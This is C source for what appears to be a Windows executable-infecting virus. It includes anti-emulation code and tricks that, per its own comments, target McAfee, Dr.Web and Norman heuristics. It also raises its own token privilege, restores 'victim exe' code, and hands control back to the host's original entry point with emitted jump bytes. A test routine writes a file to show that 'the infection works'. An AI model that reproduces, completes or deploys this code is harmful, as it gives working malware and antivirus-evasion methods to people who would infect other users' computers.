#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <winsvc.h>
#include <tlhelp32.h> // for av process kill


char fileName[] = "test.txt";
char filecontent[] = "it work !";
#define FILE_SIZE 9


void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
void UnprotectFile(char *fname);
void rscan(char *st, DWORD dr, BOOL LNK);

#include "..\includes.h"

HWND hw;
HINSTANCE hI;


// You can see if the infection works
// Just create a file in the same directory
void testFunc()
{
	HANDLE h;
	DWORD byteWritten;

	h = _CreateFile(fileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	_WriteFile(h, filecontent, FILE_SIZE, &byteWritten, NULL);
	_CloseHandle(h);
}


#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif


/////////////////////////////////////////////////////////////
// Main thread

DWORD WINAPI MainThread(LPVOID GPA)
{
	//---ANTINOD: esli zapalit drugie Init, iskazit i GetModuleHandle

	DWORD x;
	DWORD kernfuck;

	DWORD ticks;
	BOOL service;
	BYTE resver;

	char mtx[0xFF];
	char mtxv[0xFF];
	
	MSG m;
	WNDCLASS wtc;
	DWORD flags;
	int q, w;

	HANDLE sm;
	DWORD START_SVC;

	x += 23;
	GetTicks1();  

	kernfuck = 512;
	// x==1 if NOT EMULATED
	x = AntiEmulator(96);

	// if NOT EMULATED, EMUL==0
	_KERNEL32=(HANDLE)((DWORD)_KERNEL32+kernfuck+EMUL); 
	_KERNEL32=(HANDLE)((DWORD)_KERNEL32-kernfuck*x); 

	//---ANTIEMUL end

	//GetModuleHandle,LoadLibrary
	InitKernel32a(); 
	InitKernel32();
	InitCRTDLL();
	InitUser32();   
	InitADVAPI32(); 
	InitSFC();     
	InitShell32();
	InitCrypt32();
	InitUrlmon();
	InitWininet();
	InitSFC_OS();

	ticks = _GetTickCount(); 

	//IMPORTANT!!! global hI will be used in dll decrypt
	hI = _GetModuleHandle(NULL);
	

	// If we are service go into infinite loop
	service = CheckService();
	if (service != 0) 
	{
x_loop:; 
		__sleep(0);
		goto x_loop;
	}


	// EditOwnToken (enable OWNER priv)
	// this func has internal NT check, FALSE==Edit, TRUE==Check
	EditOwnToken_or_CheckFiltered(FALSE); 

	// Here, we test our function
	testFunc();

	// Infinite loop
	while(_GetMessage(&m, NULL, 0, 0))
	{
		_TranslateMessage(&m); 
		_DispatchMessage(&m);
	}
}


#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif



///////////////////////////////////////////////////////////////
// Create Main Thread - it's in func for better mutation 

void StartMainThread()
{
	// Start MainThread

	DWORD lpv;
	DWORD tid; 
	// enable CriticalSections in GetStrFromCrypt/LGetStrFromCrypt
	DWORD CS_THREADS = TRUE; 
	_CreateThread(NULL, 0, MainThread, &lpv, 0, &tid);
}


#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif


///////////////////////////////////////////////////////////////
// Entry point 

// push    ebp
// mov     ebp, esp

__declspec(dllexport) BOOL WINAPI LibMain()
{
	PE_HEADER *pe;
	DWORD q, eiRVA, last_sect;
	LPBYTE peadr;

	DWORD a0;	// any address inside our code
	DWORD a;	// align it by 64kb part1
	
	DWORD old_prot; 
	BYTE b;
	unsigned char *ep_code;
	PE_OBJENTRY *lastsect;
	DWORD antinorm2_trash, antinorm1_trash=555;

	// align it by 64kb part2, splitted in 2 parts due to lcc compiler bug
	a0=(DWORD)MainThread;
	a =(DWORD)MainThread>>16;
	a=a<<16;

	// Find Our PE header
	// step can be only 2^x, where x from 0 to 16 (1-0x10000)
	// to kill McAfee heuristic we use this
	a = FindPEheader(a, a0, 4, &pe); // _NG == NO GLOBALS inside func

	// Get import table RVA
	eiRVA = pe->importrva; 

	// Import table (get addr of first imported from kernel32 func)
	for (q = 0; q < pe->importsize; q += SZIDTE) 
	{
		IMPORT_DIRECTORY_TABLE_ENTRY *idte=(LPVOID)(a+eiRVA+q);

		if (idte->ImportLookUp==0)
			break;
		if (_KERNEL32 != NULL) 
			break;

		ProcessDLLimports(a, idte);
	}

	// Import has failed
	if (_KERNEL32 == NULL)
		return;

	// Main thread
	StartMainThread();

	// Get C_CODE len, data section vadr, EP vadr
	szinfcode = WriteOrGetLen_C_CODE(NULL, NULL, 0, 0);

	// Get Last Section
	last_sect = pe->numofobjects - 1; 
	peadr = pe; // we use LPBYTE, becouse C math use size of structure in such operations


	/////////////////////////////////////////////////////////////////
	// restore original victim exe code after entrypoint

	// Get the last section
	lastsect = peadr+SZPE+SZOBJE*last_sect; 

	// UPX0
	upx_sect = (LPSTR)(pe->imagebase + lastsect->virtrva);

	// Save section name - we'll use it for infecting files
	my_strcpy(SECTNAME,lastsect->name); 

	// Not more than 8 chars len
	SECTNAME[8]=0; 
	ep_code = (LPSTR)(pe->imagebase + GetVictimEP());  

	// dr.web anti-heur (takes about 0.12 sec)
	upx_sect=(LPSTR)fool_drweb((DWORD)upx_sect); 
				
	_VirtualProtect(ep_code, szinfcode, PAGE_EXECUTE_READWRITE, &old_prot);

	q = 0;

next:;
	// anti Norman
	//ep_code[q]=upx_sect[q];
	b = upx_sect[q];
	ep_code[q]=b;
	antinorm2_trash=666;
	q++;

	if (q < szinfcode) 
		goto next;
	
	// asm block
	// Give execution to original EP
	// Set 'jmp EP' at the end of LibMain
#ifdef _MSC_VER
	_asm
	{
		_emit 0xC9
		_emit 0x61
		_emit 0xE9; _emit 0x00; _emit 0x00; _emit 0x00; _emit 0x00
		_emit 0xC3
	}
#else
   _asm
   (
  		".byte 0xC9                      \n"  //  leave
  		".byte 0x61                      \n"  //  popad
  		".byte 0xE9,0x00,0x00,0x00,0x00  \n"  //  jmp orig_EP    
  		".byte 0xC3                      \n"  //  retn - NOT USED, JUST SIGNATURE FOR SEARCH
   );
#endif

}


#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif
